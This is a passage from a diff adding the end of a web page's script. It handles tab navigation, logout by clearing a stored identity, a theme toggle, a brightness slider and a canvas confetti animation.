+        };
+
+        // Navigation Controller Actions
+        document.getElementById("nav-tab-home").onclick = function() {
+          this.classList.add("active");
+          document.getElementById("nav-tab-settings").classList.remove("active");
+          document.getElementById("view-section-home").classList.remove("hidden");
+          document.getElementById("view-section-settings").classList.add("hidden");
+        };
+
+        document.getElementById("nav-tab-settings").onclick = function() {
+          this.classList.add("active");
+          document.getElementById("nav-tab-home").classList.remove("active");
+          document.getElementById("view-section-settings").classList.remove("hidden");
+          document.getElementById("view-section-home").classList.add("hidden");
+        };
+
+        document.getElementById("nav-tab-logout").onclick = function() {
+          localStorage.removeItem("ww_logged_identity");
+          location.reload();
+        };
+
+        btnToggleTheme.onclick = function() {
+          if (document.body.getAttribute("data-theme") === "light") {
+            document.body.removeAttribute("data-theme");
+          } else {
+            document.body.setAttribute("data-theme", "light");
+          }
+        };
+
+        sliderBrightness.oninput = function() {
+          labelBrightnessValue.textContent = this.value + "%";
+          document.documentElement.style.setProperty('--brightness', this.value + '%');
+        };
+      }
+
+      // Render loop logic engine canvas
+      const celebrationCanvas = document.getElementById("canvas-celebration");
+      const celebrationCtx = celebrationCanvas.getContext("2d");
+      let activeConfettiLoop = false;
+      let particlePool = [];
+
+      function updateCanvasSurfaceResolution() {
+        celebrationCanvas.width = window.innerWidth;
+        celebrationCanvas.height = window.innerHeight;
+      }
+      window.addEventListener("resize", updateCanvasSurfaceResolution);
+      updateCanvasSurfaceResolution();
+
+      function activateConfettiShower() {
+        activeConfettiLoop = true;
+        particlePool = [];
+        for (let i = 0; i < 80; i++) {
+          particlePool.push({
+            x: Math.random() * celebrationCanvas.width,
+            y: Math.random() * celebrationCanvas.height - celebrationCanvas.height,
+            size: Math.random() * 5 + 4,
+            speedY: Math.random() * 3 + 3,
+            color: `hsl(${Math.random() * 360}, 85%, 65%)`
+          });
+        }
+        requestAnimationFrame(renderLoopAnimationStep);
+      }
+
+      function renderLoopAnimationStep() {
+        if (!activeConfettiLoop) return;
+        celebrationCtx.clearRect(0, 0, celebrationCanvas.width, celebrationCanvas.height);
+        particlePool.forEach(p => {
+          p.y += p.speedY;
+          celebrationCtx.fillStyle = p.color;
+          celebrationCtx.fillRect(p.x, p.y, p.size, p.size);
+          if (p.y > celebrationCanvas.height) {
+            p.y = -10;
+            p.x = Math.random() * celebrationCanvas.width;
+          }
+        });
+        requestAnimationFrame(renderLoopAnimationStep);
+      }
+
+      function deactivateConfettiShower() {
+        activeConfettiLoop = false;
+        celebrationCtx.clearRect(0, 0, celebrationCanvas.width, celebrationCanvas.height);
+      }
+    });
+  </script>
+</body>
+</html>
